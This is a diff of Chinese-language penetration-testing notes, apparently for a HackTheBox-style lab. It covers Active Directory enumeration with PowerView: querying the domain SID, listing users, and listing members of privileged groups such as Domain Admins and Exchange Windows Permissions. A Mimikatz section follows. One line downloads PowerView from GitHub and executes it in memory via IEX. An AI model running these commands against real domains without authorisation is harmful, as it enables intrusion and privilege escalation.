@@ -27,6 +27,7 @@
     IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1")
 
 >>> 開始枚舉:
+  最基本的東西: 
   >>>> 獲取Domain SID: 
     Get-DomainSID -Server 10.129.46.228
   >>>> 獲取DC資訊: 
@@ -34,6 +35,12 @@
   >>>> 列出當前foothold的各種屬性Domain User: 
   >>>> samaccountname, 
     Get-DomainUser -Server 10.129.46.228 | Select-Object samaccountname, description, memberof | Format-Table -AutoSize
+
+  Domain內的狀況(# 重要群組成員):
+  Get-DomainGroupMember -Identity "Domain Admins" -Server 10.129.95.210
+  Get-DomainGroupMember -Identity "Account Operators" -Server 10.129.95.210
+  Get-DomainGroupMember -Identity "Exchange Windows Permissions" -Server 10.129.95.210
+  Get-DomainGroupMember -Identity "Organization Management" -Server 10.129.95.210
 
 
 >>> Mimikatz: 
